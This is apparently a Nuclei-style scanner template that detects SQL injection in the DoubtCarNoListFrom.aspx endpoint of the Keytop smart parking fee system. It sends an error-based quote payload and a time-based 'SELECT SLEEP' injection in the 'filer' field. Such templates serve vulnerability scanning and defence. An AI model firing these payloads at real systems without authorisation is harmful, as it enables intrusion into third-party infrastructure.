id: poc-yaml-keytop-toll-system-doubtcarnolistfrom-aspx-sqli
info:
  name: 科拓全智能停车收费系统 DoubtCarNoListFrom.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in the 科拓全智能停车收费系统 DoubtCarNoListFrom.aspx endpoint.

variables:
  t1: "{{rand_int(2, 5)}}"
  t2: "{{to_number(t1) + to_number(t1)}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        POST /KT_Admin/CarCard/DoubtCarNoListFrom.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        start=0&limit=20&filer=1'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "SQL syntax"
          - "MySQL server"

  - raw:
      - |
        POST /KT_Admin/CarCard/DoubtCarNoListFrom.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        start=0&limit=20&filer=1;SELECT SLEEP({{t1}})#
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "success:true"
      - type: dsl
        dsl:
          - "duration > to_number(t2)"
          - "duration < to_number(t3)"
